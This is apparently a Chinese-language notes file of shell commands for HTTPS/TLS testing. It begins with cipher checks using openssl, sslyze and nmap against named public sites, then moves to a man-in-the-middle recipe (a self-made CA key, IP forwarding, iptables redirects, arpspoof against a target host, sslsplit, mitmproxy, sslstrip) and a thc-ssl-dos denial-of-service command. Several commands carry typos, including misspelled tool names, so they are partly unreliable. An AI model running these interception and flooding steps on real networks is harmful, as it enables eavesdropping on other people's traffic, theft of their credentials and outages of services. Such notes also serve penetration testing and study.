

# https

* openssl

* sslyze

* nmap

* ssl/tls 中间人攻击

* ssl/tls 拒绝服务攻击

## openssl
```shell 
    openssl s_client -connect www.baidu.com:443
    openssl s_client -tls 1_2 -cipher "ECDH-RSA-RC4-SHA"  -connect www.taobao.com:443
        密钥交换-身份认证-数据加密-HSAH算法
    openssl s_client -tls1_2 -cipher "NULL,EXPORT,LOW,DES" -connect www.taobao.com:443
    openssl ciphers -v "NULL,EXPORT,LOW,DES"
```

## sslyze
```shell 
    sslyze --regular ww.taobao.com:443
```

## nmap
```shell 
    nmap --script=ssl-enum-ciphers.nse www.taobao.com
```

## ssl/tls 中间人攻击
```shell 
SSLsplit
    b. 利用openssl生成证书私钥
        openssl genrsa -out ca.key 2048
    c. 利用私钥签名生成证书
        openssl req -new -x509 -days 1096 -key ca.key -out ca.crt
    d. 启动路由
        sysctl -w net.ipv4.ip_forward=1
    e. iptables端口转发
        iptables -t nat -F
        iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
        iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
        iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 #MSA
        iptables -t nat -L
    f. arp欺骗
        arpspoof -i eth0 -t 1.1.1.2 -r 1.1.1.1
    g. 启动sslspit
        mkdir -p test/logdir
        sslspit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080

    -----------------------
    mitmproxy
    a. iptables 端口转发规则
        iptables -t nat -F
        iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
    b. mitmproxy
        mitmproxy -T --host -w mitmproxy.log 


    ----------------------
    sslstrip -l 8080
```


## ssl/tls 拒绝服务攻击
```shell 

    thc-ssl-dns{
        a. thc-ssl-dos 198.162.0.107 443 --accept
    }
```



